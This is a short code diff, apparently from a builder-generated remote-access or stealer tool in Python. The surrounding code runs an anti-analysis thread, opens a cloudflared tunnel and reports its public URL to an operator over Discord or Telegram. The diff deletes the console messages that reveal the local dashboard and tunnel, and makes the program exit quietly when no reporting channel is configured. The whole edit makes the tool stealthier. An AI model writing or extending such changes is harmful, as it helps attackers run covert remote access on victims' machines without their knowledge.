@@ -7933,7 +7933,7 @@ def main():
     has_telegram = TELEGRAM_BOT_TOKEN and not TELEGRAM_BOT_TOKEN.startswith("BUILD_") and not TELEGRAM_BOT_TOKEN.startswith("ENC:") and TELEGRAM_CHAT_ID and not TELEGRAM_CHAT_ID.startswith("BUILD_") and not TELEGRAM_CHAT_ID.startswith("ENC:")
 
     if not has_discord and not has_telegram:
-        print("[IGR] No Discord/Telegram configured - running in standalone mode (dashboard only)")
+        return
 
     try:
         threading.Thread(target=_delayed_anti_analysis, daemon=True).start()
@@ -7989,10 +7989,6 @@ def main():
         CLOUDFLARED_PUBLIC_URL = start_cloudflared(port) or ""
     except:
         CLOUDFLARED_PUBLIC_URL = ""
-    
-    print(f"[IGR] Dashboard running on http://localhost:{port}")
-    if CLOUDFLARED_PUBLIC_URL:
-        print(f"[IGR] Tunnel: {CLOUDFLARED_PUBLIC_URL}")
     
     if CLOUDFLARED_PUBLIC_URL:
         if has_discord:
